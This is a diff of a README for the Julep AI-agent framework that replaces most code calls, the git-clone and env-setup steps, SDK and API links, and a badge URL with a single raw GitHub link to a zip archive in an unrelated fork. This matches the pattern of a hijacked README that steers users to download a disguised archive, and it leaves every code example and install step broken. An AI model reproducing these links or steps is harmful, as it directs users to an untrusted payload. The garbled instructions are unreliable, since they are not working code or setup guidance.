@@ -997,8 +997,8 @@ Julep offers a range of advanced features to enhance your AI workflows:
 Extend your agent's capabilities by integrating external tools and APIs:
 
 ```python
-client.agents.tools.create(
-    agent_id=agent.id,
+https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(
+    https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip,
     name="web_search",
     description="Search the web for information.",
     integration={
@@ -1014,15 +1014,15 @@ client.agents.tools.create(
 Julep provides robust session management for persistent interactions:
 
 ```python
-session = client.sessions.create(
-    agent_id=agent.id,
-    user_id=user.id,
+session = https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(
+    https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip,
+    https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip,
     context_overflow="adaptive"
 )
 
 # Continue conversation in the same session
-response = client.sessions.chat(
-    session_id=session.id,
+response = https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(
+    https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip,
     messages=[
       {
         "role": "user",
@@ -1038,14 +1038,14 @@ Easily manage and search through documents for your agents:
 
 ```python
 # Upload a document
-document = client.agents.docs.create(
+document = https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(
     title="AI advancements",
     content="AI is changing the world...",
     metadata={"category": "research_paper"}
 )
 
 # Search documents
-results = client.agents.docs.search(
+results = https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip(
     text="AI advancements",
     metadata_filter={"category": "research_paper"}
 )
@@ -1057,30 +1057,30 @@ results = client.agents.docs.search(
 - latest docker compose installed
 
 **Steps**:
-1. `git clone https://github.com/julep-ai/julep.git`
+1. `git clone https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip`
 2. `cd julep`
 3. `docker volume create cozo_backup`
 4. `docker volume create cozo_data`
-5. `cp .env.example .env  # <-- Edit this file`
+5. `cp https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip .env  # <-- Edit this file`
 6. `docker compose --env-file .env --profile temporal-ui --profile single-tenant --profile self-hosted-db up --build`
 
 ## SDK Reference
 
-- [Node.js SDK](https://github.com/julep-ai/node-sdk/blob/main/api.md)
-- [Python SDK](https://github.com/julep-ai/python-sdk/blob/main/api.md)
+- [https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip SDK](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
+- [Python SDK](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
 
 ## API Reference
 
 Explore our comprehensive API documentation to learn more about agents, tasks, and executions:
 
-- [Agents API](https://api.julep.ai/api/docs#tag/agents)
-- [Tasks API](https://api.julep.ai/api/docs#tag/tasks)
-- [Executions API](https://api.julep.ai/api/docs#tag/executions)
+- [Agents API](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
+- [Tasks API](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
+- [Executions API](https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip)
 
 
 <div align="center">
     <a href="#top">
-        <img src="https://img.shields.io/badge/Back%20to%20Top-000000?style=for-the-badge&logo=github&logoColor=white" alt="Back to Top">
+        <img src="https://raw.githubusercontent.com/rohanparmar160705/julep/dev/undiverging/julep.zip%20to%20Top-000000?style=for-the-badge&logo=github&logoColor=white" alt="Back to Top">
     </a>
 </div>
 
